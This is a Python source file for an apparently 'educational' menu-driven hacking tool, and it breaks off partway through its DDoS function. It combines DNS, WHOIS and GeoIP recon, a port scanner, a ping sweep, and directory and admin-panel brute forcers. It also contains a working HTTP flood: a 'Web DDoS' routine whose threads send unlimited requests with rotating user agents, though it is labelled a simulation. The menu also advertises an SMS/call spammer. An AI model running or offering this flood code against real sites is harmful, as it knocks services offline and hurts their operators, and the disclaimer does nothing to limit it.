#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import threading
import subprocess
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import dns.resolver
import phonenumbers
from phonenumbers import carrier, geocoder, timezone

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

# Loading Animations
class Loading:
    @staticmethod
    def bar(message, duration=2):
        animation = [
            "[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", 
            "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]",
            "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"
        ]
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            print(f"\r{Colors.YELLOW}{animation[i % len(animation)]} {message}{Colors.RESET}", end="", flush=True)
            time.sleep(0.2)
            i += 1
        print("\r" + " " * (len(message) + 15) + "\r", end="")

    @staticmethod
    def spinner(message, duration=2):
        spinner = ['|', '/', '-', '\\']
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            print(f"\r{Colors.YELLOW}{spinner[i % len(spinner)]} {message}{Colors.RESET}", end="", flush=True)
            time.sleep(0.1)
            i += 1
        print("\r" + " " * (len(message) + 3) + "\r", end="")

    @staticmethod
    def dots(message, duration=2):
        end_time = time.time() + duration
        while time.time() < end_time:
            for i in range(4):
                dots = "." * (i + 1)
                print(f"\r{Colors.YELLOW}{message}{dots}   {Colors.RESET}", end="", flush=True)
                time.sleep(0.2)
        print("\r" + " " * (len(message) + 6) + "\r", end="")

    @staticmethod
    def color(message, duration=2):
        colors = [Colors.RED, Colors.YELLOW, Colors.GREEN, Colors.CYAN, Colors.BLUE]
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            color = colors[i % len(colors)]
            print(f"\r{color}⏳ {message}{Colors.RESET}", end="", flush=True)
            time.sleep(0.2)
            i += 1
        print("\r" + " " * (len(message) + 3) + "\r", end="")

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def print_banner():
    clear_screen()
    banner = f"""
{Colors.RED}
 ██░ ██  ▄▄▄       ███▄    █   ▄████  ███▄ ▄███▓ ▄▄▄       ███▄    █ 
▓██░ ██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ 
▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒
░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒
░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░
 ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░ ░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░
 ░  ░░ ░  ░   ▒      ░   ░ ░ ░ ░   ░ ░      ░     ░   ▒      ░   ░ ░ 
 ░  ░  ░      ░  ░         ░       ░        ░         ░  ░         ░ 
{Colors.RESET}
{Colors.YELLOW}╔══════════════════════════════════════════════════════════╗
║{Colors.CYAN}           PYTHON HACKING TOOL v4.0 - EDUCATIONAL       {Colors.YELLOW}║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def print_menu():
    menu = f"""
{Colors.GREEN}╔══════════════════════════════════════════════════════════╗
║{Colors.WHITE}                     MAIN MENU                     {Colors.GREEN}║
╠══════════════════════════════════════════════════════════╣
║ {Colors.YELLOW}1.{Colors.WHITE} Information Gathering                          {Colors.GREEN}║
║ {Colors.YELLOW}2.{Colors.WHITE} Port Scanner                                   {Colors.GREEN}║
║ {Colors.YELLOW}3.{Colors.WHITE} Ping Sweep                                     {Colors.GREEN}║
║ {Colors.YELLOW}4.{Colors.WHITE} Directory Brute Forcer                         {Colors.GREEN}║
║ {Colors.YELLOW}5.{Colors.WHITE} Website Information                            {Colors.GREEN}║
║ {Colors.YELLOW}6.{Colors.WHITE} Admin Panel Finder                             {Colors.GREEN}║
║ {Colors.YELLOW}7.{Colors.WHITE} DDoS Web (EDUCATIONAL ONLY)                   {Colors.GREEN}║
║ {Colors.YELLOW}8.{Colors.WHITE} SMS/Call Spammer (EDUCATIONAL)                {Colors.GREEN}║
║ {Colors.YELLOW}9.{Colors.WHITE} About                                         {Colors.GREEN}║
║ {Colors.YELLOW}10.{Colors.WHITE} Exit                                         {Colors.GREEN}║
╚══════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(menu)

# ==================== INFORMATION GATHERING ====================
def information_gathering_menu():
    while True:
        clear_screen()
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"║{Colors.WHITE}                INFORMATION GATHERING               {Colors.CYAN}║")
        print(f"╠══════════════════════════════════════════════════════════╣")
        print(f"║ {Colors.YELLOW}1.{Colors.WHITE} WHOIS Lookup                                {Colors.CYAN}║")
        print(f"║ {Colors.YELLOW}2.{Colors.WHITE} DNS Lookup                                 {Colors.CYAN}║")
        print(f"║ {Colors.YELLOW}3.{Colors.WHITE} Reverse DNS                                {Colors.CYAN}║")
        print(f"║ {Colors.YELLOW}4.{Colors.WHITE} GeoIP Lookup                               {Colors.CYAN}║")
        print(f"║ {Colors.YELLOW}5.{Colors.WHITE} Back to Main Menu                          {Colors.CYAN}║")
        print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option (1-5): {Colors.RESET}")
        
        if choice == '1':
            whois_lookup()
        elif choice == '2':
            dns_lookup()
        elif choice == '3':
            reverse_dns_lookup()
        elif choice == '4':
            geoip_lookup()
        elif choice == '5':
            return
        else:
            print(f"{Colors.RED}[!] Invalid choice{Colors.RESET}")
            time.sleep(1)

def whois_lookup():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                      WHOIS LOOKUP                   {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    domain = input(f"\n{Colors.YELLOW}[?] Enter domain (e.g., example.com): {Colors.RESET}")
    
    try:
        Loading.bar("Performing WHOIS lookup...", 2)
        result = subprocess.run(['whois', domain], capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n{Colors.CYAN}=== WHOIS RESULTS ==={Colors.RESET}\n")
            print(result.stdout)
        else:
            print(f"{Colors.RED}[!] Failed to perform WHOIS lookup{Colors.RESET}")
            print(result.stderr)
    except FileNotFoundError:
        print(f"{Colors.RED}[!] WHOIS tool not found. Install with: sudo apt install whois{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

def dns_lookup():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                       DNS LOOKUP                    {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    domain = input(f"\n{Colors.YELLOW}[?] Enter domain (e.g., example.com): {Colors.RESET}")
    
    try:
        Loading.spinner("Performing DNS lookup...", 2)
        
        print(f"\n{Colors.CYAN}=== DNS RECORDS ==={Colors.RESET}")
        
        # A Record
        print(f"\n{Colors.BLUE}[A Records]{Colors.RESET}")
        try:
            a_records = dns.resolver.resolve(domain, 'A')
            for record in a_records:
                print(f"{Colors.WHITE}{record.address}{Colors.RESET}")
        except dns.resolver.NoAnswer:
            print(f"{Colors.RED}No A records found{Colors.RESET}")
        except dns.resolver.NXDOMAIN:
            print(f"{Colors.RED}Domain does not exist{Colors.RESET}")
        
        # MX Record
        print(f"\n{Colors.BLUE}[MX Records]{Colors.RESET}")
        try:
            mx_records = dns.resolver.resolve(domain, 'MX')
            for record in mx_records:
                print(f"{Colors.WHITE}{record.exchange} (Priority: {record.preference}){Colors.RESET}")
        except dns.resolver.NoAnswer:
            print(f"{Colors.RED}No MX records found{Colors.RESET}")
        
        # NS Record
        print(f"\n{Colors.BLUE}[NS Records]{Colors.RESET}")
        try:
            ns_records = dns.resolver.resolve(domain, 'NS')
            for record in ns_records:
                print(f"{Colors.WHITE}{record.target}{Colors.RESET}")
        except dns.resolver.NoAnswer:
            print(f"{Colors.RED}No NS records found{Colors.RESET}")
        
        # TXT Record
        print(f"\n{Colors.BLUE}[TXT Records]{Colors.RESET}")
        try:
            txt_records = dns.resolver.resolve(domain, 'TXT')
            for record in txt_records:
                print(f"{Colors.WHITE}{record.strings[0].decode()}{Colors.RESET}")
        except dns.resolver.NoAnswer:
            print(f"{Colors.RED}No TXT records found{Colors.RESET}")
        
        # CNAME Record
        print(f"\n{Colors.BLUE}[CNAME Records]{Colors.RESET}")
        try:
            cname_records = dns.resolver.resolve(domain, 'CNAME')
            for record in cname_records:
                print(f"{Colors.WHITE}{record.target}{Colors.RESET}")
        except dns.resolver.NoAnswer:
            print(f"{Colors.RED}No CNAME records found{Colors.RESET}")
        
        # SOA Record
        print(f"\n{Colors.BLUE}[SOA Records]{Colors.RESET}")
        try:
            soa_records = dns.resolver.resolve(domain, 'SOA')
            for record in soa_records:
                print(f"{Colors.WHITE}MNAME: {record.mname}")
                print(f"RNAME: {record.rname}")
                print(f"SERIAL: {record.serial}")
                print(f"REFRESH: {record.refresh}")
                print(f"RETRY: {record.retry}")
                print(f"EXPIRE: {record.expire}")
                print(f"MINIMUM: {record.minimum}{Colors.RESET}")
        except dns.resolver.NoAnswer:
            print(f"{Colors.RED}No SOA records found{Colors.RESET}")
        
    except dns.resolver.NoNameservers:
        print(f"{Colors.RED}[!] No nameservers found for the domain{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

def reverse_dns_lookup():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                   REVERSE DNS LOOKUP               {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    ip = input(f"\n{Colors.YELLOW}[?] Enter IP address: {Colors.RESET}")
    
    try:
        Loading.dots("Performing reverse DNS lookup", 2)
        hostname, _, _ = socket.gethostbyaddr(ip)
        print(f"\n{Colors.CYAN}=== RESULT ==={Colors.RESET}")
        print(f"{Colors.WHITE}IP: {ip}")
        print(f"Hostname: {hostname}{Colors.RESET}")
    except socket.herror:
        print(f"{Colors.RED}[!] No reverse DNS record found{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

def geoip_lookup():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                     GEOIP LOOKUP                   {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    ip = input(f"\n{Colors.YELLOW}[?] Enter IP address: {Colors.RESET}")
    
    try:
        Loading.color("Looking up GeoIP information", 2)
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url)
        data = response.json()
        
        if data['status'] == 'success':
            print(f"\n{Colors.CYAN}=== GEOIP INFORMATION ==={Colors.RESET}")
            print(f"{Colors.WHITE}IP: {data['query']}")
            print(f"Country: {data['country']}")
            print(f"Country Code: {data['countryCode']}")
            print(f"Region: {data['regionName']} ({data['region']})")
            print(f"City: {data['city']}")
            print(f"ZIP: {data['zip']}")
            print(f"Latitude: {data['lat']}")
            print(f"Longitude: {data['lon']}")
            print(f"Timezone: {data['timezone']}")
            print(f"ISP: {data['isp']}")
            print(f"Organization: {data['org']}")
            print(f"AS: {data['as']}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[!] Failed to retrieve GeoIP information: {data.get('message', 'Unknown error')}{Colors.RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[!] Network error: {str(e)}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== PORT SCANNER ====================
def port_scanner():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                      PORT SCANNER                    {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    target = input(f"\n{Colors.YELLOW}[?] Enter target (IP/Domain): {Colors.RESET}")
    start_port = int(input(f"{Colors.YELLOW}[?] Start port (default 1): {Colors.RESET}") or 1)
    end_port = int(input(f"{Colors.YELLOW}[?] End port (default 100): {Colors.RESET}") or 100)
    
    if start_port > end_port:
        print(f"{Colors.RED}[!] Start port must be less than or equal to end port{Colors.RESET}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
        return
    
    try:
        Loading.bar("Preparing scan...", 2)
        target_ip = socket.gethostbyname(target)
        Loading.color(f"Scanning ports on {target_ip}", 1)
        
        open_ports = []
        lock = threading.Lock()
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    try:
                        service = socket.getservbyport(port)
                    except:
                        service = "unknown"
                    with lock:
                        print(f"{Colors.GREEN}[+] Port {port} is open ({service}){Colors.RESET}")
                        open_ports.append(port)
                sock.close()
            except socket.error:
                pass
        
        threads = []
        max_threads = 50
        for port in range(start_port, end_port + 1):
            while threading.active_count() > max_threads:
                time.sleep(0.1)
            thread = threading.Thread(target=scan_port, args=(port,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
            
        print(f"\n{Colors.CYAN}=== SCAN RESULTS ==={Colors.RESET}")
        if open_ports:
            print(f"{Colors.WHITE}Target: {target_ip}")
            print(f"Open ports: {', '.join(map(str, sorted(open_ports)))}{Colors.RESET}")
        else:
            print(f"{Colors.RED}[-] No open ports found in range {start_port}-{end_port}{Colors.RESET}")
            
    except socket.gaierror:
        print(f"{Colors.RED}[!] Could not resolve hostname{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== PING SWEEP ====================
def ping_sweep():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                      PING SWEEP                     {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    network = input(f"\n{Colors.YELLOW}[?] Enter network (e.g., 192.168.1.0/24): {Colors.RESET}")
    
    try:
        Loading.spinner("Performing ping sweep...", 2)
        
        # Validate network format
        if "/24" not in network:
            print(f"{Colors.RED}[!] Currently only supports /24 networks{Colors.RESET}")
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
            return
            
        base_ip = network.split("/")[0]
        base_parts = base_ip.split(".")
        if len(base_parts) != 4:
            raise ValueError("Invalid IP format")
        
        active_hosts = []
        lock = threading.Lock()
        
        def ping_host(ip):
            try:
                param = "-n" if os.name == "nt" else "-c"
                timeout = "-w" if os.name == "nt" else "-W"
                result = subprocess.run(['ping', param, '1', timeout, '1', ip], 
                                      stdout=subprocess.DEVNULL, 
                                      stderr=subprocess.DEVNULL)
                if result.returncode == 0:
                    with lock:
                        print(f"{Colors.GREEN}[+] {ip} is up{Colors.RESET}")
                        active_hosts.append(ip)
            except:
                pass
        
        threads = []
        max_threads = 20
        
        for i in range(1, 255):
            ip = f"{base_parts[0]}.{base_parts[1]}.{base_parts[2]}.{i}"
            
            while threading.active_count() > max_threads:
                time.sleep(0.1)
                
            thread = threading.Thread(target=ping_host, args=(ip,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        print(f"\n{Colors.CYAN}=== SCAN RESULTS ==={Colors.RESET}")
        print(f"{Colors.WHITE}Network: {network}")
        print(f"Active hosts: {len(active_hosts)}{Colors.RESET}")
        
    except ValueError as e:
        print(f"{Colors.RED}[!] Invalid IP format: {str(e)}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== DIRECTORY BRUTE FORCER ====================
def directory_brute_forcer():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                 DIRECTORY BRUTE FORCER               {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    url = input(f"\n{Colors.YELLOW}[?] Enter URL (e.g., http://example.com): {Colors.RESET}")
    wordlist = input(f"{Colors.YELLOW}[?] Path to wordlist (leave empty for default): {Colors.RESET}")
    
    # Validate URL
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        response = requests.get(url, timeout=5)
        if response.status_code >= 400:
            print(f"{Colors.RED}[!] Target seems unreachable (HTTP {response.status_code}){Colors.RESET}")
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
            return
    except requests.exceptions.RequestException:
        print(f"{Colors.RED}[!] Could not connect to target{Colors.RESET}")
        input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
        return
    
    if not wordlist:
        # Create a default wordlist
        default_dirs = [
            "admin", "login", "wp-admin", "wp-login", "administrator", 
            "backup", "backups", "test", "tmp", "temp", "secret",
            "assets", "images", "css", "js", "uploads", "downloads",
            "cgi-bin", "phpmyadmin", "db", "database", "sql",
            "private", "secure", "hidden", "config", "configuration",
            "wp-content", "wp-includes", "logs", "archive", "old",
            "api", "rest", "v1", "v2", "dev", "development", "stage", "staging"
        ]
        wordlist = default_dirs
    else:
        try:
            with open(wordlist, 'r') as f:
                wordlist = f.read().splitlines()
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to read wordlist: {str(e)}{Colors.RESET}")
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
            return
    
    try:
        Loading.dots("Starting brute force", 2)
        
        found_dirs = []
        lock = threading.Lock()
        
        def check_dir(directory):
            try:
                target_url = f"{url}/{directory}"
                response = requests.get(target_url, timeout=5)
                if response.status_code == 200:
                    with lock:
                        print(f"{Colors.GREEN}[+] Found: {target_url} (Status: {response.status_code}){Colors.RESET}")
                        found_dirs.append(target_url)
                elif response.status_code in [301, 302, 307, 308]:
                    with lock:
                        print(f"{Colors.YELLOW}[+] Found redirect: {target_url} -> {response.headers.get('Location', '?')} (Status: {response.status_code}){Colors.RESET}")
                        found_dirs.append(target_url)
                elif response.status_code == 403:
                    with lock:
                        print(f"{Colors.BLUE}[+] Found (Forbidden): {target_url} (Status: {response.status_code}){Colors.RESET}")
                        found_dirs.append(target_url)
            except:
                pass
        
        threads = []
        max_threads = 10
        
        for directory in wordlist:
            while threading.active_count() > max_threads:
                time.sleep(0.1)
                
            thread = threading.Thread(target=check_dir, args=(directory,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        print(f"\n{Colors.CYAN}=== SCAN RESULTS ==={Colors.RESET}")
        print(f"{Colors.WHITE}Target: {url}")
        print(f"Wordlist size: {len(wordlist)}")
        print(f"Found directories: {len(found_dirs)}{Colors.RESET}")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== WEBSITE INFORMATION ====================
def website_info():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                    WEBSITE INFORMATION               {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    url = input(f"\n{Colors.YELLOW}[?] Enter URL (e.g., http://example.com): {Colors.RESET}")
    
    try:
        Loading.bar("Gathering website information...", 2)
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        print(f"\n{Colors.CYAN}=== WEBSITE INFORMATION ==={Colors.RESET}")
        print(f"{Colors.WHITE}URL: {url}")
        print(f"Status Code: {response.status_code}")
        print(f"Server: {response.headers.get('Server', 'Unknown')}")
        print(f"Content Type: {response.headers.get('Content-Type', 'Unknown')}")
        print(f"Content Length: {len(response.content)} bytes")
        
        # Security headers
        security_headers = {
            'X-Frame-Options': response.headers.get('X-Frame-Options', 'Not present'),
            'X-XSS-Protection': response.headers.get('X-XSS-Protection', 'Not present'),
            'X-Content-Type-Options': response.headers.get('X-Content-Type-Options', 'Not present'),
            'Content-Security-Policy': response.headers.get('Content-Security-Policy', 'Not present'),
            'Strict-Transport-Security': response.headers.get('Strict-Transport-Security', 'Not present')
        }
        
        print(f"\n{Colors.BLUE}=== SECURITY HEADERS ==={Colors.RESET}")
        for header, value in security_headers.items():
            print(f"{Colors.WHITE}{header}: {value}{Colors.RESET}")
        
        # Get title
        title = soup.title.string if soup.title else "No title found"
        print(f"\n{Colors.BLUE}Title:{Colors.RESET} {title}")
        
        # Get meta description
        description = soup.find("meta", attrs={"name": "description"})
        if description:
            print(f"{Colors.BLUE}Description:{Colors.RESET} {description.get('content')}")
        else:
            print(f"{Colors.BLUE}Description:{Colors.RESET} No description meta tag")
        
        # Get meta keywords
        keywords = soup.find("meta", attrs={"name": "keywords"})
        if keywords:
            print(f"{Colors.BLUE}Keywords:{Colors.RESET} {keywords.get('content')}")
        
        # Get links
        links = soup.find_all('a')
        print(f"\n{Colors.BLUE}Found {len(links)} links (showing first 5):{Colors.RESET}")
        for link in links[:5]:
            href = link.get('href')
            if href:
                print(f"{Colors.WHITE}- {href}{Colors.RESET}")
        
        # Get forms
        forms = soup.find_all('form')
        print(f"\n{Colors.BLUE}Found {len(forms)} forms (showing first 3):{Colors.RESET}")
        for form in forms[:3]:
            print(f"{Colors.WHITE}- Action: {form.get('action', 'None')}")
            print(f"  Method: {form.get('method', 'GET')}")
            inputs = form.find_all('input')
            print(f"  Inputs: {len(inputs)}")
            for inp in inputs[:3]:  # Show first 3 inputs as example
                print(f"    - Name: {inp.get('name', 'None')}, Type: {inp.get('type', 'text')}")
        
        # Get scripts
        scripts = soup.find_all('script')
        print(f"\n{Colors.BLUE}Found {len(scripts)} scripts{Colors.RESET}")
        
    except requests.exceptions.RequestException as e:
        print(f"{Colors.RED}[!] Connection error: {str(e)}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== ADMIN PANEL FINDER ====================
def admin_panel_finder():
    clear_screen()
    print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}                    ADMIN PANEL FINDER                {Colors.CYAN}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    url = input(f"\n{Colors.YELLOW}[?] Enter URL (e.g., http://example.com): {Colors.RESET}")
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    common_admin_panels = [
        "admin", "administrator", "panel", "wp-admin", "wp-login", 
        "login", "admin/login", "adminarea", "backend", "secure", 
        "admincp", "adminportal", "controlpanel", "cpanel", "admincontrol", 
        "useradmin", "adminlogin", "sysadmin", "manager", "webadmin",
        "dashboard", "control", "admin1", "admin2", "admin3", "admin4",
        "admin5", "moderator", "webmaster", "root", "system", "console",
        "account", "accounts", "user", "users", "staff", "employee",
        "office", "member", "members", "private", "priv", "hidden",
        "secret", "protected", "restricted", "auth", "authentication",
        "signin", "sign-in", "signin", "sign-in", "manage", "management"
    ]
    
    try:
        Loading.spinner("Searching for admin panels...", 2)
        
        found_panels = []
        lock = threading.Lock()
        
        def check_panel(panel):
            try:
                target_url = f"{url}/{panel}"
                response = requests.get(target_url, timeout=5)
                
                if response.status_code == 200:
                    title = BeautifulSoup(response.text, 'html.parser').title
                    title_text = title.string.lower() if title else ""
                    
                    # Check for common admin page indicators
                    is_admin_page = (
                        "admin" in title_text or
                        "login" in title_text or
                        "dashboard" in title_text or
                        "control panel" in title_text or
                        "password" in response.text.lower() or
                        "username" in response.text.lower()
                    )
                    
                    if is_admin_page:
                        with lock:
                            print(f"{Colors.GREEN}[+] Possible admin panel: {target_url} (Status: {response.status_code}){Colors.RESET}")
                            found_panels.append(target_url)
                elif response.status_code in [301, 302, 307, 308]:
                    location = response.headers.get('Location', '')
                    if any(word in location.lower() for word in ['admin', 'login', 'dashboard']):
                        with lock:
                            print(f"{Colors.YELLOW}[+] Found redirect to possible admin panel: {target_url} -> {location} (Status: {response.status_code}){Colors.RESET}")
                            found_panels.append(target_url)
                elif response.status_code == 403:
                    with lock:
                        print(f"{Colors.BLUE}[+] Found (Forbidden): {target_url} - might be protected admin panel (Status: {response.status_code}){Colors.RESET}")
                        found_panels.append(target_url)
                elif response.status_code == 401:
                    with lock:
                        print(f"{Colors.CYAN}[+] Found (Unauthorized): {target_url} - might be protected admin panel (Status: {response.status_code}){Colors.RESET}")
                        found_panels.append(target_url)
            except:
                pass
        
        threads = []
        max_threads = 15
        
        for panel in common_admin_panels:
            while threading.active_count() > max_threads:
                time.sleep(0.1)
                
            thread = threading.Thread(target=check_panel, args=(panel,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        for thread in threads:
            thread.join()
        
        print(f"\n{Colors.CYAN}=== SCAN RESULTS ==={Colors.RESET}")
        print(f"{Colors.WHITE}Target: {url}")
        print(f"Admin panels checked: {len(common_admin_panels)}")
        print(f"Possible admin panels found: {len(found_panels)}{Colors.RESET}")
        
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {str(e)}{Colors.RESET}")
    
    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")

# ==================== DDoS WEB (EDUCATIONAL ONLY) ====================
def ddos_web():
    clear_screen()
    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗")
    print(f"║{Colors.WHITE}         WEB DDoS TOOL (FOR EDUCATIONAL PURPOSES)    {Colors.RED}║")
    print(f"╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}[!] WARNING: This tool is for educational purposes only!")
    print(f"[!] Do not use this for illegal activities!{Colors.RESET}")
    
    confirm = input(f"\n{Colors.YELLOW}[?] Do you understand and agree? (y/n): {Colors.RESET}")
    if confirm.lower() != 'y':
        return
    
    url = input(f"\n{Colors.YELLOW}[?] Enter target URL (e.g., http://example.com): {Colors.RESET}")
    threads_count = int(input(f"{Colors.YELLOW}[?] Number of threads (default 10): {Colors.RESET}") or 10)
    duration = int(input(f"{Colors.YELLOW}[?] Duration in seconds (default 10): {Colors.RESET}") or 10)
    
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    try:
        # Verify target is reachable
        response = requests.get(url, timeout=5)
        if response.status_code >= 400:
            print(f"{Colors.RED}[!] Target seems unreachable (HTTP {response.status_code}){Colors.RESET}")
            input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.RESET}")
            return
    
        Loading.color("Preparing DDoS attack simulation...", 2)
        
        stop_flag = False
        requests_sent = 0
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        ]
        
        def attack():
            nonlocal requests_sent
            while not stop_flag:
                try:
                    headers = {
                        'User-Agent': random.choice(user_agents)
                    }
                    requests.get(url, headers=headers, timeout=1)
                    requests_sent += 1
                except:
                    pass
        
        threads = []
        for _ in range(threads_count):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        print(f"\n{Colors.RED}[!] Simulating DDoS attack (press Ctrl+C to stop)...{Colors.RESET}")
        start_time = time.time()
        
        try:
            while time.time() - start_time < duration:
                elapsed = time.time() - start_time
                requests_per_sec = requests_sent / elapsed if elapsed > 0 else 0
